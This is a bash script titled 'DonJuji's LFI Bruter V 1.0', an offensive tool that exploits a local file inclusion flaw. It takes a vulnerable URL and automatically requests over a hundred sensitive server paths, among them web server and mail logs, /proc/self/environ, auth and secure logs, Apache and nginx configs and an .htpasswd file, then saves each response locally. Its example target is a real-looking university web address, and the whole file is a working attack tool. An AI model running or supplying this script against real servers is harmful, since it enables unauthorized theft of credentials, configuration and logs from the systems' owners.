#!/bin/bash
echo "Welcome To DonJuji's LFI Bruter V 1.0"
echo "Please Enter Full URL Of LFI."
echo "Example: http://bscacad3.buffalostate.edu/~ibrahim01/download.php?file="
read lfiurl
mkdir LFIdump
cd LFIdump
echo "Parsing Paths!"
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/php-fpm\/error.log \>\> error.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/php-fpm\/www-error.log \>\> www-error.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/share\/httpd\/error \>\> error/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/bin\/mysqlaccess \>\> mysqlaccess/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/apache\/logs\/error_log \>\> error_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/apache\/error \>\> error/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/apache\/error_log \>\> error_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/apache\/error.log \>\> error.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/apache\/access_log \>\> access_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/apache\/access.log \>\> access.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/apache2\/error_log \>\> error_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/apache2\/error.log \>\> error.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/apache2\/access_log \>\> access_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/apache2\/access.log \>\> access.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/share\/apache2\/error \>\> error/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/vsftpd.log \>\> vsftpd.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/sshd.log \>\> sshd.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/mail \>\> mail/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/proc\/self\/fd \>\> fd/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/proc\/self\/environ \>\> environ/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/httpd\/conf\/httpd.conf \>\> httpd.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/hosts \>\> hosts/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/auth.log \>\> auth.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/httpd\/access_log \>\> access_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/httpd\/error_log \>\> error_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/syslog \>\> syslog/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/apache2\/suphp_log \>\> suphp_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/local\/apache\/logs\/access_log \>\> access_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/local\/apache\/logs\/error_log \>\> error_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/local\/apache\/domlogs \>\> domlogs/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/exim_mainlog \>\> exim_mainlog/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/exim_rejectlog \>\> exim_rejectlog/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/local\/cpanel\/logs\/access_log \>\> access_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/local\/cpanel\/logs\/error_log \>\> error_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/messages \>\> messages/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/secure \>\> secure/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/httpd-access.log \>\> httpd-access.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/td-agent\/httpd-access.log.pos \>\> httpd-access.log.pos/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache2\/envvars \>\> envvars/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache2\/sites-available\/000-default.conf \>\> 000-default.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache2\/apache2.conf \>\> apache2.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache2\/conf-available\/other-vhosts-access-log.conf \>\> other-vhosts-access-log.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache\/envvars \>\> envvars/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache\/sites-available\/000-default.conf \>\> 000-default.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache\/apache2.conf \>\> apache2.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache\/conf-available\/other-vhosts-access-log.conf \>\> other-vhosts-access-log.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache2\/sites-available\/default-ssl.conf \>\> default-ssl.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache2\/sysconfig.d\/global.conf \>\> global.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache2\/httpd.conf \>\> httpd.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/apache2\/mod_log_config.conf \>\> mod_log_config.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/php-scripts.log \>\> php-scripts.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/php.errors \>\> php.errors/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/local\/apache2\/logs\/error_log \>\> error_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/httpd\/logs\/error_log \>\> error_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/httpd\/conf.d \>\> conf.d/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/nginx\/error.log \>\> error.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/nginx\/access.log \>\> access.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/php5-fpm.log \>\> php5-fpm.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/private\/var\/log\/apache2\/error_log \>\> error_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/local\/cpanel\/logs\/ \>\> /" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/php-errors.log \>\> php-errors.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/dev.log \>\> dev.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/prod.log \>\> prod.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/php_errors.log \>\> php_errors.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/boot.log \>\> boot.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/cron.log \>\> cron.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/mysqld.log \>\> mysqld.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/rsyslog.conf \>\> rsyslog.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/nginx\/conf.d \>\> conf.d/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/nginxerror.log \>\> nginxerror.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/php-fpm73.log \>\> php-fpm73.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/nginx\/error_log \>\> error_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/nginx\/modsec_audit.log \>\> modsec_audit.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/proftpd\/auth.log \>\> auth.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/proftpd\/access.log \>\> access.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/pureftpd.log \>\> pureftpd.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/maillog \>\> maillog/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/dovecot-lmtp.log \>\> dovecot-lmtp.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/dovecot-lmtp-errors.log \>\> dovecot-lmtp-errors.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/exim\/mainlog \>\> mainlog/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/exim\/paniclog \>\> paniclog/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/exim\/processlog \>\> processlog/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/exim\/rejectlog \>\> rejectlog/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/yum.log \>\> yum.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/anaconda.log \>\> anaconda.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/rsyslog.d \>\> rsyslog.d/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/local\/apache\/bin\/rotatelogs \>\> rotatelogs/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/access_log \>\> access_log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/local\/apache\/domlogs\/ \>\> /" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/exim4\/mainlog \>\> mainlog/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/exim\/main.log \>\> main.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/mail.log \>\> mail.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/proftpd\/proftpd.log \>\> proftpd.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/samba \>\> samba/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/error.log.1 \>\> error.log.1/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/apt\/history.log \>\> history.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/mysql\/error.log \>\> error.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/mysql\/mysql-slow.log \>\> mysql-slow.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/apache-sp\/error.log \>\> error.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/nginx-sp\/error.log \>\> error.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/td-agent\/s3 \>\> s3/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/td-agent\/apache2.access.log.pos \>\> apache2.access.log.pos/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/td-agent\/td-agent.log \>\> td-agent.log/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/faillog \>\> faillog/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/logrotate.conf \>\> logrotate.conf/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/cron.daily\/logrotate \>\> logrotate/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/cron.daily\/logrotate.d \>\> logrotate.d/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/cron.daily\/sysklogd \>\> sysklogd/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/httpd\/.htpasswd \>\> .htpasswd/" >> LFI_Brute.sh
echo $lfiurl | sed -E "s/(.*)/curl \1\/etc\/httpd\/conf.d\/webdav.conf \>\> webdav.conf/" >> LFI_Brute.sh
echo "Done Parsing Paths, Requesting Files!"
bash LFI_Brute.sh
rm LFI_Brute.sh
echo "All DONE XD DonJuji Loves You!"
echo "All DONE XD DonJuji Loves You!"
echo "All DONE XD DonJuji Loves You!"
echo "All DONE XD DonJuji Loves You!"

